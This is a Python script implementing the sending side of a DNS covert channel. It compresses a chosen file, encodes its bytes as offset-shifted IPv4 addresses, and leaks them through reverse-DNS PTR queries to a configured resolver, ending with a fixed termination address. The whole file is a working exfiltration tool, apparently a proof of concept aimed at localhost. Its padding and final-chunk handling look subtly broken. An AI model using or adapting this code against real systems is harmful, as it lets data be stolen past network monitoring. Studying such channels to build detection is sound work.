from dns import resolver, reversename, message, query, name, rrset, rdataclass, rdatatype, flags, asyncquery
import random
import os
import zipfile
from math import floor
import sys

baseline = 0

# The first octet is used as a 'key' for decoding subsequent octets. If the first digit of the octet is even, then the second octet was looped back around
# from 255; an odd digit means no such transformation happened. Using this, we can reassemble the bytes on the server-side.
def send_data(set_baseline=False,octets=[]):
    global baseline
    beginning_octet = ""
    if set_baseline:
        print("SENDING BASELINE")
        baseline = random.randrange(30,100)
        beginning_octet = "172"
        octets  = [random.randrange(0,255),random.randrange(0,255)]
        constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{baseline}"
    else:
        for index in range(len(octets)):
            # Calculate the offsetted value
            octets[index] = str(int(octets[index]) + baseline)
            # If the value is greater than 255, we have to wrap back around. We note this with an even digit in the first octet
            if int(octets[index]) > 255:
                if len(beginning_octet) < 1:
                    beginning_octet="2"
                else:
                    beginning_octet+=str(random.choice([x for x in range(2, 5, 2)]))
                octets[index] = str(int(octets[index]) - 255)
            else:
                if len(beginning_octet) < 1:
                    beginning_octet="1"
                else:
                    beginning_octet+=str(random.choice([x for x in range(1, 4, 2)]))

            # Build the address that will be sent to the server
            constructed = f"{beginning_octet}.{octets[0]}.{octets[1]}.{octets[2]}"

    reverse_dns_dnspython(f"{constructed}")
   

def convert_to_ipv4(portion):
    ipv4_address_elements = []
    for byte in portion:
        ipv4_address_elements.append(str(int(byte,16)))
    send_data(set_baseline=False,octets=ipv4_address_elements)

def reverse_dns_dnspython(ip_address):
    req_name = reversename.from_address(ip_address)
    res = resolver.Resolver()
    res.nameservers = ['127.0.0.1']
    res.port = 49250
    res.timeout=0.1
    res.lifetime=0.1
    try:
        res.resolve(req_name, rdtype=rdatatype.PTR, rdclass=rdataclass.IN)
    except:
        pass

def cleanup(items):
    for item in items:
        if os.path.isfile(item):
            os.remove(item)

if __name__ == "__main__":
    filename = sys.argv[1]
    size_of_chunk = 3
    cleanup(["compressed.gz"])

    with zipfile.ZipFile("compressed.gz", mode="w", compression=zipfile.ZIP_DEFLATED,compresslevel=9) as archive:
        archive.write(f"{filename}")

    with open("compressed.gz","rb") as f: 
        data = f.read().hex()

    # Split the full hex data into hex bytes, and add any necessary 00 padding at the end.
    segmented = [data[i:i+2] for i in range(0, len(data), 2)]
    padding = ['00']*(len(segmented) % size_of_chunk)
    segmented = segmented + padding
    send_data(set_baseline=True)

    # Send chunks of three encoded bytes to the server
    prior = 0
    print("[*] SENDING DATA")
    for index in range(0,len(segmented)):
        if index!=0 and index%size_of_chunk==0:
            convert_to_ipv4(segmented[prior:index])
            prior = index
        print(f"[*] {index}/{floor(len(segmented))}")
    
    print(f"[?] {len(padding)} 00'S APPENDED TO END OF RECOVERED FILE FOR PADDING")

    # Send hardcoded termination value
    reverse_dns_dnspython("104.6.7.2")
    print(f"[!] FINISHED SENDING DATA")
    cleanup(["compressed.gz"])